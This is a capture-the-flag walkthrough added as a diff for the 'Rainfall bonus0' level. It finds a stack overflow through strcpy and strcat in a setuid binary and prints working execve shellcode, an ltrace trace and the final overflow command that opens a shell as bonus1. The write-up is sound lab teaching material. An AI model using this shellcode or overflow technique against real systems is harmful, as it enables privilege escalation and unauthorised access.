@@ -1,0 +1,71 @@
+# Rainfall Bonus 0 Guide
+This guide will walk you through the process of finding the password for the `bonus1` user.
+
+## 1. Examine your environment
+
+`ls -la` : Lists files and their permissions in the current directory.
+```bash
+-rwsr-s---+ 1 bonus1 users  5566 Mar  6  2016 bonus0
+```
+
+We can see that the `bonus0` binary has the `setuid` bit set, which means that it runs with the permissions of the owner of the file. In this case, the owner is `bonus1`. It executable by the `users` group, our current group.
+
+The program awaits two inputs and concatenate them in a string.
+```bash
+bonus0@RainFall:~$ ./bonus0 
+ - 
+sdf
+ - 
+sdf
+sdf sdf
+```
+
+## 2. Reverse engineering
+
+We will use Ghidra to reverse engineer the binary.
+You can find the analysis in [Ressources/ghidra.c](Ressources/ghidra.c), and the reconstructed C code in [source.c](source.c).
+
+## 3. Analysis
+
+We find a main function, a char buffer called `local_3a`.
+In the pp() function, we can now see that there are two other char buffers of size 20.
+
+We can also see that within the read() function, it reads 4096 characters.
+
+## 4. Exploitation
+
+We can now guess that thanks to the strcpy() and strcat() functions, we can concatenate the first part of our shellcode within the `local_34`, and the rest within `local_20`.
+The goal is to retrieve the shellcode stored in the `local_3a` variable stored in the main function.
+
+To test it, we can run the following:
+```bash
+bonus0@RainFall:~$ python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd" + "\n" + "t"*(4096-21) + "\x80" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag" + "\n"' | ltrace ./bonus0 
+__libc_start_main(0x80485a4, 1, 0xbffff6f4, 0x80485d0, 0x8048640 <unfinished ...>
+puts(" - " - 
+)                                                                                                          = 4
+read(0, "1\311\367\341\260\013Qh//shh/bin\211\343\315\nttttttttttt"..., 4096)                                        = 4096
+strchr("1\311\367\341\260\013Qh//shh/bin\211\343\315\nttttttttttt"..., '\n')                                         = "\nttttttttttttttttttttttttttttttt"...
+strncpy(0xbffff5d8, "1\311\367\341\260\013Qh//shh/bin\211\343\315", 20)                                              = 0xbffff5d8
+puts(" - " - 
+)                                                                                                          = 4
+read(0, "\200Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9A"..., 4096)                                                              = 203
+strchr("\200Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9A"..., '\n')                                                               = "\n\ntttttttttttttttttttttttttttttt"...
+strncpy(0xbffff5ec, "\200Aa0Aa1Aa2Aa3Aa4Aa5A", 20)                                                                   = 0xbffff5ec
+strcpy(0xbffff626, "1\311\367\341\260\013Qh//shh/bin\211\343\315\200Aa0Aa1Aa2Aa"...)                                 = 0xbffff626
+strcat("1\311\367\341\260\013Qh//shh/bin\211\343\315\200Aa0Aa1Aa2Aa"..., "\200Aa0Aa1Aa2Aa3Aa4Aa5A\364\017\375\267")  = "1\311\367\341\260\013Qh//shh/bin\211\343\315\200Aa0Aa1Aa2Aa"...
+puts("1\311\367\341\260\013Qh//shh/bin\211\343\315\200Aa0Aa1Aa2Aa"...1���
+                                                                         Qh//shh/bin��̀Aa0Aa1Aa2Aa3Aa4Aa5A��� �Aa0Aa1Aa2Aa3Aa4Aa5A���
+)                                               = 70
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+```
+
+We found the address we wanted, which is `0xbffff626`.
+Our shellcode is properly stored in it.
+
+We can now run this command:
+```bash
+(python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd" + "\n" + "t"*(4096-21) + "\x80" + "b"*8 + "\x26\xf6\xff\xbf" + "a"*7 + "\n"'; cat ) | ./bonus0
+```
+
+The shell is now open and you can run the `whoami` command, then get the following flag.
